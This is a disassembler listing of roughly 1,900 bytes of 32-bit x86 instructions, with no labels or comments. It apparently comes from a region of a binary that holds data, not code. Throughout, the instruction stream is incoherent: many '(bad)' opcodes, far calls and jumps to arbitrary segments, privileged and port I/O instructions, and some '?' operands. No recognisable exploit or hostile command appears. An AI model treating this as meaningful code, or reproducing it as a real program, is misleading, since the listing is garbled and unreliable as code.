  41bcd4:	adc    DWORD PTR [ebx+0x5ab9a521],edx
  41bcda:	fnsave [esi-0x1d]
  41bcdd:	lock push edi
  41bcdf:	pushf  
  41bce0:	and    BYTE PTR [edx-0xf074ff1],ah
  41bce6:	les    esi,FWORD PTR [ebp+0x12a1828]
  41bcec:	call   0x4a3a:0x1cc2bb63
  41bcf3:	mov    dh,0x90
  41bcf5:	test   esi,esp
  41bcf7:	icebp  
  41bcf8:	pminsw mm2,mm1
  41bcfb:	dec    edx
  41bcfc:	(bad)  
  41bcfd:	pop    ss
  41bcfe:	(bad)  
  41bcff:	jl     0x41bd17
  41bd01:	shl    ecx,cl
  41bd03:	int    0xe1
  41bd05:	lods   eax,DWORD PTR ds:[esi]
  41bd06:	aam    0xd6
  41bd08:	and    dl,BYTE PTR [ebp+0x63]
  41bd0b:	fisubr DWORD PTR [ebx+0x2c]
  41bd0e:	jge    0x41bd76
  41bd10:	imul   edx,DWORD PTR [ebx-0x65],0xfffffff1
  41bd14:	push   esi
  41bd15:	inc    ebx
  41bd16:	or     BYTE PTR [ecx-0x72],cl
  41bd19:	shl    BYTE PTR [eax+esi*4],0x1
  41bd1d:	in     al,dx
  41bd1e:	push   0x40
  41bd20:	dec    edx
  41bd21:	jmp    0x41bcee
  41bd23:	lods   al,BYTE PTR ds:[esi]
  41bd24:	popf   
  41bd25:	adc    BYTE PTR [eax],0xa0
  41bd28:	dec    ebp
  41bd29:	cmp    eax,ebp
  41bd2b:	mov    bl,0x2e
  41bd2d:	loopne 0x41bd48
  41bd2f:	lahf   
  41bd30:	lock cmp dh,0xee
  41bd34:	je     0x41bd2e
  41bd36:	bound  esp,QWORD PTR [esi+0xc]
  41bd39:	pop    esp
  41bd3a:	cli    
  41bd3b:	add    dh,0x81
  41bd3e:	sar    DWORD PTR [ecx+edx*2+0x77f469fa],cl
  41bd45:	dec    eax
  41bd46:	call   0x54b8:0xf9f90ff7
  41bd4d:	lods   eax,DWORD PTR ds:[esi]
  41bd4e:	iret   
  41bd4f:	mov    edx,0x12315a4d
  41bd54:	inc    ebx
  41bd55:	inc    esi
  41bd56:	cmp    DWORD PTR ds:0xa1fb038a,ebx
  41bd5c:	xchg   dl,dl
  41bd5e:	and    ecx,DWORD PTR [edx*2+0x253c4228]
  41bd65:	arpl   WORD PTR [esi+0x70],cx
  41bd68:	jp     0x41bd16
  41bd6a:	push   edx
  41bd6b:	rol    dh,1
  41bd6d:	cmc    
  41bd6e:	jle    0x41bdd2
  41bd70:	push   edi
  41bd71:	jae    0x41bdd5
  41bd73:	add    DWORD PTR ds:0xbf44d9ce,esp
  41bd79:	adc    BYTE PTR [esi],bh
  41bd7b:	inc    esp
  41bd7c:	std    
  41bd7d:	aam    0x32
  41bd7f:	mov    al,0x82
  41bd81:	push   edi
  41bd82:	std    
  41bd83:	add    al,BYTE PTR [ecx+edi*2]
  41bd86:	dec    eax
  41bd87:	cmp    DWORD PTR [ecx+0x71e8b50d],esi
  41bd8d:	(bad)  
  41bd8e:	ficom  WORD PTR [eax-0x2d]
  41bd91:	pusha  
  41bd92:	pop    esi
  41bd93:	or     bh,BYTE PTR [edx+ebx*8]
  41bd96:	push   es
  41bd97:	repz pop ds
  41bd99:	jae    0x41bd75
  41bd9b:	ins    DWORD PTR es:[edi],dx
  41bd9c:	ror    BYTE PTR [edi],1
  41bd9e:	add    eax,0x8ccb1e09
  41bda3:	cmp    edx,DWORD PTR [ecx+0x50626b72]
  41bda9:	inc    edx
  41bdaa:	pop    ebx
  41bdab:	mov    ds:0x5876f3ef,eax
  41bdb0:	(bad)  
  41bdb1:	mov    ebp,0xaa2f39a2
  41bdb6:	xor    al,0x8e
  41bdb8:	scas   eax,DWORD PTR es:[edi]
  41bdb9:	test   edx,ebp
  41bdbb:	adc    eax,0xa59e87fc
  41bdc0:	ins    DWORD PTR es:[edi],dx
  41bdc1:	cmp    ah,BYTE PTR [ebp+0x3b8b056]
  41bdc7:	outs   dx,DWORD PTR ds:[esi]
  41bdc8:	out    dx,eax
  41bdc9:	dec    ebp
  41bdca:	inc    eax
  41bdcb:	adc    ecx,DWORD PTR [esi+0x3a8dea92]
  41bdd1:	jp     0x41be46
  41bdd3:	(bad)  
  41bdd4:	repz pop esp
  41bdd6:	popa   
  41bdd7:	es cmp eax,0x2dd97509
  41bddd:	jmp    0x2cc31ccc
  41bde2:	or     al,0x3e
  41bde4:	lahf   
  41bde5:	xchg   ebx,eax
  41bde6:	das    
  41bde7:	mov    ecx,0x66083930
  41bded:	jno    0x41bd8f
  41bdef:	push   esi
  41bdf0:	adc    DWORD PTR [esi],ecx
  41bdf2:	mov    ecx,0x87b86f6c
  41bdf7:	xor    dl,cl
  41bdf9:	mov    BYTE PTR [edi-0x50c485de],0x1f
  41be00:	outs   dx,DWORD PTR ds:[esi]
  41be01:	(bad)  
  41be02:	outs   dx,DWORD PTR ds:[esi]
  41be03:	inc    ebp
  41be04:	ds xchg esp,eax
  41be06:	push   0x3b
  41be08:	cmc    
  41be09:	cwde   
  41be0a:	or     DWORD PTR [ebp-0x4eabdcb6],esp
  41be10:	mov    ebp,DWORD PTR [ecx-0x17]
  41be13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be14:	mov    al,0xef
  41be16:	xchg   esp,eax
  41be17:	xor    DWORD PTR [ebp+0x5e],esp
  41be1a:	lea    edx,[ecx-0x1f56d297]
  41be20:	cwde   
  41be21:	jl     0x41bdb0
  41be23:	mov    dl,0x86
  41be25:	sub    edi,DWORD PTR [ecx-0x4d]
  41be28:	pop    es
  41be29:	loope  0x41bdc4
  41be2b:	pop    eax
  41be2c:	enter  0x1ce2,0xac
  41be30:	cdq    
  41be31:	retf   
  41be32:	ds sti 
  41be34:	mov    ecx,0x3e680c8b
  41be39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be3a:	pop    edx
  41be3b:	xchg   ecx,eax
  41be3c:	call   0x98fe:0x656fc66c
  41be43:	les    esi,FWORD PTR [edx]
  41be45:	mov    ds:0x93f1095a,eax
  41be4a:	push   eax
  41be4b:	and    BYTE PTR [eax-0x784d7936],bh
  41be51:	ffree  st(0)
  41be53:	dec    ebp
  41be54:	retf   0x3ab8
  41be57:	dec    esp
  41be58:	int3   
  41be59:	push   edx
  41be5a:	cmp    al,0x42
  41be5c:	jmp    0x985c:0xb971d8ae
  41be63:	ror    DWORD PTR [esp+ebx*1-0x43a17423],0xf9
  41be6b:	and    ebp,0x9b6a4988
  41be71:	adc    edx,DWORD PTR [ebx-0x3d]
  41be74:	aam    0x27
  41be76:	xor    eax,0x58ac8183
  41be7b:	xchg   ebp,eax
  41be7c:	fcom   QWORD PTR [ecx+eiz*4-0x2a]
  41be80:	add    eax,0x6956ee2c
  41be85:	sti    
  41be86:	sbb    DWORD PTR [esi+0x7a159d3d],ebp
  41be8c:	jmp    0x41be2f
  41be8e:	mov    dh,0x82
  41be90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be91:	cld    
  41be92:	jmp    0x41beb5
  41be94:	sbb    edx,edx
  41be96:	in     al,0x5d
  41be98:	cmp    cl,BYTE PTR [esp+ebx*4-0x47]
  41be9c:	dec    ebx
  41be9d:	pop    edx
  41be9e:	xchg   ebx,eax
  41be9f:	shl    BYTE PTR [eax+0x31],1
  41bea2:	fadd   QWORD PTR [ecx]
  41bea4:	(bad)  
  41bea6:	push   ss
  41bea7:	enter  0xd7e1,0x6b
  41beab:	ror    BYTE PTR cs:[ebp-0x347b6b11],cl
  41beb2:	(bad)  
  41beb3:	pop    ss
  41beb4:	mov    al,0x9d
  41beb6:	inc    ecx
  41beb7:	push   es
  41beb8:	sub    ecx,esi
  41beba:	retf   0x762f
  41bebd:	stos   DWORD PTR es:[edi],eax
  41bebe:	imul   esp,DWORD PTR [esi+0x835b250],0xffffffe5
  41bec5:	push   0xffffffe5
  41bec7:	dec    eax
  41bec8:	mov    BYTE PTR [eax+0x71],dh
  41becb:	jns    0x41bf1f
  41becd:	int3   
  41bece:	shr    BYTE PTR [edx-0x158e721c],0x1d
  41bed5:	test   BYTE PTR [ecx-0x31],cl
  41bed8:	in     al,0x56
  41beda:	mov    al,0x4f
  41bedc:	mov    eax,ds:0x4982d64b
  41bee1:	push   es
  41bee2:	jg     0x41bedb
  41bee4:	mov    ebp,0x18954771
  41bee9:	add    eax,0xa154a696
  41beee:	pop    eax
  41beef:	push   0x5f
  41bef1:	push   ss
  41bef2:	mov    bl,0x65
  41bef4:	stos   DWORD PTR es:[edi],eax
  41bef5:	jg     0x41becc
  41bef7:	es out 0x6f,eax
  41befa:	and    eax,0xffffffd6
  41befd:	dec    esi
  41befe:	cmp    DWORD PTR [edi+0x54],esi
  41bf01:	iret   
  41bf02:	add    DWORD PTR [ecx],ebp
  41bf04:	pop    es
  41bf05:	mov    WORD PTR [esi],?
  41bf07:	pop    ecx
  41bf08:	push   eax
  41bf09:	jmp    0x41becf
  41bf0b:	(bad)  
  41bf0e:	xor    eax,0xe8c5f417
  41bf13:	(bad)  
  41bf14:	test   al,0xf1
  41bf16:	sbb    bl,ah
  41bf18:	jnp    0x41bf20
  41bf1a:	jbe    0x41bf73
  41bf1c:	mov    esp,0x199614a0
  41bf21:	fsubp  st(4),st
  41bf23:	jg     0x41beb1
  41bf25:	and    DWORD PTR [ebp-0x53],0xffffff98
  41bf29:	sbb    DWORD PTR [esi+0x82448bf],eax
  41bf2f:	xchg   ebp,edi
  41bf31:	aaa    
  41bf32:	push   ecx
  41bf33:	push   edx
  41bf34:	jle    0x41bf09
  41bf36:	pop    ds
  41bf37:	add    ch,bl
  41bf39:	out    0x3f,eax
  41bf3b:	out    dx,eax
  41bf3c:	repnz lock std 
  41bf3f:	shl    DWORD PTR [edx-0x2e],cl
  41bf42:	sahf   
  41bf43:	ret    
  41bf44:	push   ecx
  41bf45:	mov    dh,0x44
  41bf47:	jge    0x41bfbf
  41bf49:	xchg   eax,eax
  41bf4b:	add    eax,ebx
  41bf4d:	lods   eax,DWORD PTR ds:[esi]
  41bf4e:	xor    cl,BYTE PTR [ecx-0x261f04d2]
  41bf54:	pop    es
  41bf55:	lock and DWORD PTR [edi],0x1d3fb4a6
  41bf5c:	adc    BYTE PTR [edx-0x7cf44cf4],ah
  41bf62:	mov    eax,?
  41bf64:	hlt    
  41bf65:	xadd   DWORD PTR [esi],edx
  41bf68:	xchg   edx,eax
  41bf69:	sbb    DWORD PTR [ebp+0x6a295cb7],0xffffffd2
  41bf70:	out    0x17,al
  41bf72:	scas   al,BYTE PTR es:[edi]
  41bf73:	fld    st(2)
  41bf75:	push   ebx
  41bf76:	ins    BYTE PTR es:[edi],dx
  41bf77:	mov    ah,0x57
  41bf79:	sar    BYTE PTR [eax],0x1e
  41bf7c:	ins    BYTE PTR es:[edi],dx
  41bf7d:	and    BYTE PTR [ecx+0x7f],ah
  41bf80:	aam    0x0
  41bf82:	int    0x2
  41bf84:	sahf   
  41bf85:	or     al,0x84
  41bf87:	add    DWORD PTR [edi],esp
  41bf89:	(bad)  
  41bf8a:	lods   eax,DWORD PTR ds:[esi]
  41bf8b:	sahf   
  41bf8c:	test   ch,dh
  41bf8e:	pop    ebx
  41bf8f:	mov    ch,0xa0
  41bf91:	jge    0x41bfc0
  41bf93:	mov    ch,0x84
  41bf95:	shr    BYTE PTR [ebx+0x5f916196],0xae
  41bf9c:	bound  edx,QWORD PTR [ebx]
  41bf9e:	mov    ebp,0xf11ae0a
  41bfa3:	jmp    0x54e66382
  41bfa8:	ss push edi
  41bfaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfab:	scas   eax,DWORD PTR es:[edi]
  41bfac:	pop    es
  41bfad:	das    
  41bfae:	psubq  mm1,QWORD PTR [edx+0x42]
  41bfb2:	rcl    DWORD PTR [edi-0x62],cl
  41bfb5:	sub    eax,0xcdae2a9a
  41bfba:	out    dx,al
  41bfbb:	lods   eax,DWORD PTR ds:[esi]
  41bfbc:	fnstcw WORD PTR [esi]
  41bfbe:	loope  0x41c02e
  41bfc0:	aad    0xf
  41bfc2:	sub    BYTE PTR [edx],dl
  41bfc4:	neg    BYTE PTR [esi-0x68]
  41bfc7:	inc    esp
  41bfc8:	mov    cl,0xa
  41bfca:	sbb    eax,0xb4cb8a07
  41bfcf:	xor    eax,0x8d1bc5b1
  41bfd4:	and    BYTE PTR [eax-0x7d],bl
  41bfd7:	mov    al,0xae
  41bfd9:	cmp    bl,BYTE PTR ds:0x472b24e6
  41bfdf:	cmp    eax,0xcbf017cf
  41bfe4:	out    dx,eax
  41bfe5:	gs jo  0x41bfa2
  41bfe8:	rcr    BYTE PTR [ebp-0x69ce9aab],0x5f
  41bfef:	sti    
  41bff0:	dec    ecx
  41bff1:	cmp    al,0x3d
  41bff3:	cmp    DWORD PTR [edi-0x377fdd38],edx
  41bff9:	mov    bl,0x45
  41bffb:	sahf   
  41bffc:	ss xor al,0xb8
  41bfff:	in     eax,0x98
  41c001:	fidivr DWORD PTR [esi+eiz*4+0x50]
  41c005:	sahf   
  41c006:	push   ss
  41c007:	jae    0x41c044
  41c009:	fstp   TBYTE PTR [esi+ecx*8-0x80]
  41c00d:	jmp    0x41bfb8
  41c00f:	dec    esi
  41c010:	lods   eax,DWORD PTR ds:[esi]
  41c011:	fldz   
  41c013:	in     eax,0xb1
  41c015:	push   0xb60d2bad
  41c01a:	mov    bl,0x28
  41c01c:	shl    BYTE PTR [ebp+0x7591fb12],cl
  41c022:	daa    
  41c023:	popf   
  41c024:	pop    ds
  41c025:	jle    0x41c004
  41c027:	mov    fs,WORD PTR [edi+0x3f]
  41c02a:	sbb    eax,0x738602b
  41c02f:	sub    BYTE PTR [eax-0x23],0xa8
  41c033:	push   es
  41c034:	push   ebp
  41c035:	push   es
  41c036:	(bad)  
  41c037:	scas   al,BYTE PTR es:[edi]
  41c038:	cli    
  41c039:	std    
  41c03a:	jb     0x41c01e
  41c03c:	push   esp
  41c03d:	mov    bl,ah
  41c03f:	lods   eax,DWORD PTR ds:[esi]
  41c040:	das    
  41c041:	fcomip st,st(3)
  41c043:	(bad)  
  41c045:	dec    edi
  41c046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c047:	(bad)
  41c04a:	jb     0x41c02a
  41c04c:	push   ds
  41c04d:	ss es (bad) 
  41c050:	push   0xb
  41c052:	sbb    BYTE PTR [edi-0x3b06fe20],bh
  41c058:	or     BYTE PTR [ebp+0x19679bfc],dl
  41c05e:	loope  0x41c0bc
  41c060:	pop    edx
  41c061:	mov    edi,0x7d57181a
  41c066:	imul   edi,esp,0xfffffffc
  41c069:	mov    esi,0xe0db7dbc
  41c06e:	push   ds
  41c06f:	add    eax,0x12b3eb9d
  41c074:	sub    DWORD PTR [ebx],esi
  41c076:	ficomp WORD PTR [eax-0x71a3aa8f]
  41c07c:	(bad)  
  41c07d:	cwde   
  41c07e:	mov    dh,BYTE PTR [esi]
  41c080:	jne    0x41c0be
  41c082:	pop    ds
  41c083:	rcr    DWORD PTR [edx-0x6bc01358],cl
  41c089:	repnz xchg ebp,eax
  41c08b:	retf   0x4844
  41c08e:	or     edi,DWORD PTR [edi-0x4d0ba8d1]
  41c094:	mov    ecx,esi
  41c096:	mov    eax,0x68e5fb53
  41c09b:	out    0x3a,eax
  41c09d:	scas   al,BYTE PTR es:[edi]
  41c09e:	icebp  
  41c09f:	repz xchg ebp,eax
  41c0a1:	aad    0xe1
  41c0a3:	adc    BYTE PTR [edi-0x1421ba83],cl
  41c0a9:	dec    esi
  41c0aa:	es pop edi
  41c0ac:	repnz sbb DWORD PTR [esi-0x47],ebx
  41c0b0:	retf   0xf0d2
  41c0b3:	js     0x41c10e
  41c0b5:	fbld   TBYTE PTR [edx]
  41c0b7:	mov    ah,0x69
  41c0b9:	in     eax,dx
  41c0ba:	cld    
  41c0bb:	mov    ds:0xf006e751,eax
  41c0c0:	pop    edi
  41c0c1:	mov    bl,bl
  41c0c3:	dec    esi
  41c0c4:	ret    
  41c0c5:	(bad)  
  41c0c6:	das    
  41c0c7:	mov    BYTE PTR [esi-0x33],ah
  41c0ca:	sub    eax,0x1f11d7b6
  41c0cf:	retf   0x217c
  41c0d2:	push   es
  41c0d3:	outs   dx,BYTE PTR ds:[esi]
  41c0d4:	and    BYTE PTR [ecx+0x3],dl
  41c0d7:	add    DWORD PTR [ebp-0x440c1920],edi
  41c0dd:	(bad)  
  41c0de:	xor    cl,BYTE PTR [edx+0x30]
  41c0e1:	pop    ds
  41c0e2:	in     eax,dx
  41c0e3:	jmp    0x41c11b
  41c0e5:	dec    ebx
  41c0e6:	out    dx,al
  41c0e7:	in     eax,0x21
  41c0e9:	or     al,0x2
  41c0eb:	ins    BYTE PTR es:[edi],dx
  41c0ec:	mov    ecx,0xc88c5d02
  41c0f1:	inc    eax
  41c0f2:	mov    WORD PTR [ebx-0x55977aef],ss
  41c0f8:	mov    BYTE PTR [edx+0x1c],dh
  41c0fb:	xor    al,0x84
  41c0fd:	or     DWORD PTR [edx-0x1c7313cc],esi
  41c103:	adc    eax,DWORD PTR [esp+ebx*2-0x4b46e0e5]
  41c10a:	cmp    eax,0x81d2592b
  41c10f:	sub    cl,BYTE PTR [ecx+0x49ce722d]
  41c115:	sbb    al,0x6f
  41c117:	push   edi
  41c118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c119:	loope  0x41c14d
  41c11b:	mov    ebx,0xb212a2ac
  41c120:	add    DWORD PTR [esi-0x72534e74],esi
  41c126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c127:	sub    eax,0xacd77f1f
  41c12c:	scas   eax,DWORD PTR es:[edi]
  41c12d:	mov    ds:0x3eb56889,eax
  41c132:	es jp  0x41c146
  41c135:	sub    edx,DWORD PTR [eax-0x1ced890f]
  41c13b:	scas   al,BYTE PTR es:[edi]
  41c13c:	and    bl,BYTE PTR [ebx+0x66e7406]
  41c142:	mov    gs,WORD PTR [ecx-0xef68fd4]
  41c148:	mov    ebx,0x2ccb00b9
  41c14d:	lahf   
  41c14e:	pop    ebx
  41c14f:	in     al,0x40
  41c151:	pop    ecx
  41c152:	cmp    BYTE PTR [ebx+0x55f02f46],al
  41c158:	cmp    DWORD PTR [eax],0x9314ef80
  41c15e:	jo     0x41c0fa
  41c160:	mul    BYTE PTR [esi+0x79]
  41c163:	je     0x41c1ac
  41c165:	mov    ecx,0x75fbb58a
  41c16a:	pop    es
  41c16b:	mov    bl,0x4e
  41c16d:	mov    edi,0xf42ce29
  41c172:	or     ch,bh
  41c174:	fstp   TBYTE PTR [ecx-0x55]
  41c177:	popf   
  41c178:	ja     0x41c1a0
  41c17a:	pop    esi
  41c17b:	pop    edi
  41c17c:	popf   
  41c17d:	push   0xffffff9b
  41c17f:	inc    ebp
  41c180:	fadd   st,st(7)
  41c182:	jns    0x41c1c5
  41c184:	(bad)  
  41c185:	push   esi
  41c186:	jbe    0x41c15e
  41c188:	test   al,0xfe
  41c18a:	gs daa 
  41c18c:	mov    dh,0xd0
  41c18e:	leave  
  41c18f:	and    BYTE PTR [eax-0x72],dh
  41c192:	cld    
  41c193:	into   
  41c194:	in     al,0xb5
  41c196:	jno    0x41c1ec
  41c198:	call   DWORD PTR [ebp+0x10a72731]
  41c19e:	fstp   TBYTE PTR [ecx+0x74]
  41c1a1:	dec    esp
  41c1a2:	rol    DWORD PTR [edi+0x53],cl
  41c1a5:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41c1a7:	test   bh,al
  41c1a9:	xchg   DWORD PTR [ecx+0x18],eax
  41c1ac:	shl    BYTE PTR [ecx-0x77],cl
  41c1af:	adc    eax,0xfddd8467
  41c1b4:	or     edi,eax
  41c1b6:	pop    ss
  41c1b7:	push   edi
  41c1b8:	pop    es
  41c1b9:	push   esi
  41c1ba:	int    0x3f
  41c1bc:	xor    esp,DWORD PTR [ecx]
  41c1be:	(bad)  
  41c1bf:	jp     0x41c157
  41c1c1:	shr    esi,1
  41c1c3:	test   BYTE PTR [esp+eax*1],dh
  41c1c6:	fs push es
  41c1c8:	pushf  
  41c1c9:	std    
  41c1ca:	sub    al,0x7a
  41c1cc:	iret   
  41c1cd:	push   0x6d10844f
  41c1d2:	cld    
  41c1d3:	pop    esp
  41c1d4:	(bad)  
  41c1d5:	fs adc eax,0xa2d9e1c9
  41c1db:	shl    ah,1
  41c1dd:	sbb    eax,0xffb6b6f
  41c1e2:	inc    ebp
  41c1e3:	loopne 0x41c243
  41c1e5:	pop    ebp
  41c1e6:	jmp    FWORD PTR [edx]
  41c1e8:	retf   0x94ea
  41c1eb:	jb     0x41c1c7
  41c1ed:	lods   eax,DWORD PTR ds:[esi]
  41c1ee:	hlt    
  41c1ef:	enter  0x314a,0x54
  41c1f3:	popa   
  41c1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1f5:	dec    esi
  41c1f6:	shr    DWORD PTR [ebx+ebp*1],cl
  41c1f9:	and    bl,BYTE PTR [esi+0x3b045436]
  41c1ff:	pop    esp
  41c200:	cmc    
  41c201:	add    al,0x12
  41c203:	ret    0x1ed9
  41c206:	pop    es
  41c207:	and    BYTE PTR [eax],dh
  41c209:	jl     0x41c25a
  41c20b:	jno    0x41c27f
  41c20d:	iret   
  41c20e:	add    cl,cl
  41c210:	fwait
  41c211:	sbb    DWORD PTR cs:[ecx+0x17b8abf8],ebp
  41c218:	xchg   ecx,eax
  41c219:	sub    edi,DWORD PTR [edi+0x70aed1c2]
  41c21f:	data16 jecxz 0x41c26f
  41c222:	rcr    DWORD PTR [edi+0x4a53ee88],1
  41c228:	cwde   
  41c229:	test   DWORD PTR [esi+edx*2-0x40],0xd81f4731
  41c231:	loopne 0x41c274
  41c233:	test   DWORD PTR [esi+0x7678731b],edx
  41c239:	cmp    al,0x79
  41c23b:	jb     0x41c201
  41c23d:	dec    esi
  41c23e:	nop
  41c23f:	sbb    eax,0xbb18bf7a
  41c244:	xor    ecx,ebx
  41c246:	mov    ecx,0x6212151d
  41c24b:	pop    ecx
  41c24c:	sub    DWORD PTR [ebp+0x7db66e0a],eax
  41c252:	jb     0x41c1da
  41c254:	mov    bl,0xc0
  41c256:	retf   
  41c257:	push   ebp
  41c258:	mov    ch,0xcb
  41c25a:	jecxz  0x41c217
  41c25c:	ins    BYTE PTR es:[edi],dx
  41c25d:	cdq    
  41c25e:	loopne 0x41c26c
  41c260:	add    BYTE PTR [ecx-0x1],ah
  41c263:	clc    
  41c264:	jbe    0x41c1f2
  41c266:	pop    esi
  41c267:	ins    DWORD PTR es:[edi],dx
  41c268:	sbb    al,0xb7
  41c26a:	mov    edx,0xaaa4f5d1
  41c26f:	les    sp,DWORD PTR [edx-0x46]
  41c273:	cmp    dl,BYTE PTR [ebx+0x6]
  41c276:	loope  0x41c205
  41c278:	rol    BYTE PTR [edi+0x2a],cl
  41c27b:	xchg   BYTE PTR [ebp-0x15],dl
  41c27e:	cdq    
  41c27f:	push   cs
  41c280:	xor    eax,0x4efd3a51
  41c285:	fwait
  41c286:	xor    eax,ecx
  41c288:	and    DWORD PTR [esi+0x5e7d49af],edx
  41c28e:	and    bh,ah
  41c290:	in     al,0xda
  41c292:	in     al,0x5a
  41c294:	cwde   
  41c295:	xlat   BYTE PTR ds:[ebx]
  41c296:	sti    
  41c297:	xlat   BYTE PTR ds:[ebx]
  41c298:	jp     0x41c228
  41c29a:	sub    BYTE PTR [eax-0x7fec3c1f],ch
  41c2a0:	aas    
  41c2a1:	adc    edi,DWORD PTR [edi+0x51]
  41c2a4:	xor    esp,DWORD PTR [esp+eax*2-0xa]
  41c2a8:	pop    ss
  41c2a9:	sahf   
  41c2aa:	add    BYTE PTR [edi+0x3edf3b82],ch
  41c2b0:	enter  0x542b,0x6b
  41c2b4:	mov    eax,0x692b213b
  41c2b9:	aaa    
  41c2ba:	push   edi
  41c2bb:	int3   
  41c2bc:	adc    eax,0x320a7400
  41c2c1:	sub    eax,0x2c977b9e
  41c2c6:	call   0xddd6:0x2c7b8647
  41c2cd:	adc    eax,DWORD PTR [edi-0x2742f24d]
  41c2d3:	jp     0x41c2aa
  41c2d5:	inc    BYTE PTR ds:0xa5472657
  41c2db:	mov    cl,BYTE PTR es:[ebx+ebp*8]
  41c2df:	xor    DWORD PTR [ecx-0xa],esi
  41c2e2:	xchg   ebx,eax
  41c2e3:	xchg   BYTE PTR [ecx-0x3c4fbcbe],cl
  41c2e9:	in     eax,dx
  41c2ea:	(bad)  
  41c2eb:	and    al,0xb4
  41c2ed:	mov    DWORD PTR [ebp+0x7e],ecx
  41c2f0:	push   es
  41c2f1:	int    0xd1
  41c2f3:	outs   dx,BYTE PTR ds:[esi]
  41c2f4:	in     eax,0x44
  41c2f6:	dec    edx
  41c2f7:	xor    BYTE PTR [edi+0x20a8c287],bl
  41c2fd:	push   ebx
  41c2fe:	inc    ebx
  41c2ff:	ds iret 
  41c301:	pop    ds
  41c302:	add    al,0xcd
  41c304:	fisttp QWORD PTR [esi]
  41c306:	loope  0x41c31d
  41c308:	jle    0x41c333
  41c30a:	sahf   
  41c30b:	mov    ebp,0xcb31e922
  41c310:	imul   ebp,eax,0x7cbf3b84
  41c316:	xchg   edi,eax
  41c317:	or     ah,BYTE PTR [ecx+0x5c45efac]
  41c31d:	xor    ch,al
  41c31f:	or     eax,0xc96dea07
  41c324:	scas   al,BYTE PTR es:[edi]
  41c325:	mov    DWORD PTR [edi],edx
  41c327:	ins    DWORD PTR es:[edi],dx
  41c328:	js     0x41c356
  41c32a:	ja     0x41c384
  41c32c:	inc    ecx
  41c32d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c32e:	aaa    
  41c32f:	(bad)  
  41c330:	or     eax,0x5e82c77d
  41c335:	mov    bl,al
  41c337:	pop    ecx
  41c338:	nop
  41c339:	daa    
  41c33a:	test   BYTE PTR [eax],dh
  41c33c:	lods   eax,DWORD PTR ds:[esi]
  41c33d:	mov    BYTE PTR [edx-0xe7dacf9],dl
  41c343:	xor    DWORD PTR [eax-0xc],ecx
  41c346:	inc    edx
  41c347:	int3   
  41c348:	outs   dx,BYTE PTR ds:[esi]
  41c349:	fisub  DWORD PTR [edi-0x55]
  41c34c:	mov    dh,BYTE PTR [ebx-0xa43d4ed]
  41c352:	ds sti 
  41c354:	mov    esi,esi
  41c356:	retf   
  41c357:	inc    esi
  41c358:	cld    
  41c359:	mov    edx,0x568ce637
  41c35e:	sahf   
  41c35f:	outs   dx,DWORD PTR ds:[esi]
  41c360:	inc    edi
  41c361:	sbb    eax,0x73b592c5
  41c366:	je     0x41c2f8
  41c368:	add    al,0xd6
  41c36a:	pop    esp
  41c36b:	aad    0xaf
  41c36d:	les    edi,FWORD PTR [ebx+0x48]
  41c370:	push   esp
  41c371:	sahf   
  41c372:	iret   
  41c373:	jno    0x41c3ae
  41c375:	(bad)  
  41c378:	fistp  QWORD PTR [esi]
  41c37a:	mov    edx,0x989980c3
  41c37f:	test   eax,0x80c7e49
  41c384:	dec    esi
  41c385:	arpl   WORD PTR [eax-0xff7f83c],bx
  41c38b:	(bad)  
  41c38c:	xchg   esp,eax
  41c38d:	clc    
  41c38e:	ins    BYTE PTR es:[edi],dx
  41c38f:	push   esp
  41c390:	sbb    al,0x2d
  41c392:	jno    0x41c350
  41c394:	fld    TBYTE PTR [edx-0x1f4dc454]
  41c39a:	xor    BYTE PTR [ecx+0x47409042],0xbd
  41c3a1:	mov    fs,ebx
  41c3a3:	jl     0x41c3f5
  41c3a5:	push   esp
  41c3a6:	sub    ecx,DWORD PTR [ebx-0x4]
  41c3a9:	ja     0x41c370
  41c3ab:	push   ds
  41c3ac:	jno    0x41c341
  41c3ae:	ss xor edi,eax
  41c3b1:	enter  0xcb61,0xf3
  41c3b5:	(bad)  
  41c3b6:	cwde   
  41c3b7:	dec    esp
  41c3b8:	sbb    BYTE PTR cs:[ebx-0x4d],dl
  41c3bc:	lods   al,BYTE PTR ds:[esi]
  41c3bd:	je     0x41c40c
  41c3bf:	inc    eax
  41c3c0:	add    BYTE PTR ds:0xa8110cb3,dh
  41c3c6:	and    DWORD PTR [ebx],0x30
  41c3c9:	pop    esi
  41c3ca:	jo     0x41c39b
  41c3cc:	mov    ds:0x34dbcc4a,al
  41c3d1:	cld    
  41c3d2:	dec    esp
  41c3d3:	repz aas 
  41c3d5:	(bad)  [ebx+edi*8-0x25899e29]
  41c3dc:	push   0x1f
  41c3de:	sbb    cl,al
  41c3e0:	es mov ebx,edx
  41c3e3:	std    
  41c3e4:	dec    eax
  41c3e5:	mov    ecx,0x5004dcf7
  41c3ea:	scas   al,BYTE PTR es:[edi]
  41c3eb:	pop    edx
  41c3ec:	in     al,0xb7
  41c3ee:	imul   ecx,DWORD PTR ds:0xb570,0xffffffbd
  41c3f4:	mov    DWORD PTR [edx+ebx*4],esp
  41c3f7:	xchg   esi,eax
  41c3f8:	cld    
  41c3f9:	dec    ecx
  41c3fa:	scas   eax,DWORD PTR es:[edi]
  41c3fb:	jb     0x41c396
  41c3fd:	clc    
  41c3fe:	adc    eax,0xd12aa616
  41c403:	push   0x7cc09c
  41c408:	inc    esp
  41c409:	xor    al,0xb1
  41c40b:	xchg   esi,eax
  41c40c:	add    eax,0x9a328d20
  41c411:	mov    al,ds:0x5b9b7754
  41c416:	call   0xb575ae14
  41c41b:	jl     0x41c44f
  41c41d:	icebp  
  41c41e:	sar    BYTE PTR [edi-0x5d60f007],0xa0
  41c425:	mov    ds:0xea00f7f6,al
  41c42a:	mov    WORD PTR [ecx+0x1d],ss
  41c42d:	mov    WORD PTR [edx],cs
  41c42f:	add    DWORD PTR [edx+0x6d],esi
  41c432:	cmp    al,0x79
  41c434:	xchg   edi,eax
